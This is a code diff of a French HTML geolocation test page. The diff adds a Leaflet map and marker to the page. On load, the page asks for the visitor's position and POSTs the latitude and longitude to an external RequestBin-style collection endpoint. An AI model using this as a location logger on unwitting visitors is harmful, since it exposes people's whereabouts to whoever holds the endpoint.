@@ -1,12 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Test Géolocalisation</title>
+    <title>Test Géolocalisation avec Carte</title>
+    <!-- Feuille de style pour Leaflet -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
+    <style>
+        #map { height: 400px; width: 100%; margin-top: 20px; }
+    </style>
 </head>
 <body>
     <h1>Test de géolocalisation</h1>
     <p id="demo">Demande de position en cours...</p>
+    <div id="map"></div>
+
+    <!-- Script Leaflet -->
+    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
     <script>
+        // Initialise la carte (centrée sur une position par défaut)
+        const map = L.map('map').setView([0, 0], 2);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
+        }).addTo(map);
+
         // Demande automatique au chargement de la page
         window.onload = function() {
             if (navigator.geolocation) {
@@ -21,7 +36,14 @@
             const lon = position.coords.longitude;
             document.getElementById("demo").innerHTML = "Latitude: " + lat + "<br>Longitude: " + lon;
 
-            // Envoi des données à TON RequestBin
+            // Centre la carte sur la position obtenue
+            map.setView([lat, lon], 15);
+            // Ajoute un marqueur
+            L.marker([lat, lon]).addTo(map)
+                .bindPopup("Tu es ici !")
+                .openPopup();
+
+            // Envoi des données à RequestBin
             fetch('https://eobfknqwgjyq7j0.m.pipedream.net', {
                 method: 'POST',
                 headers: {
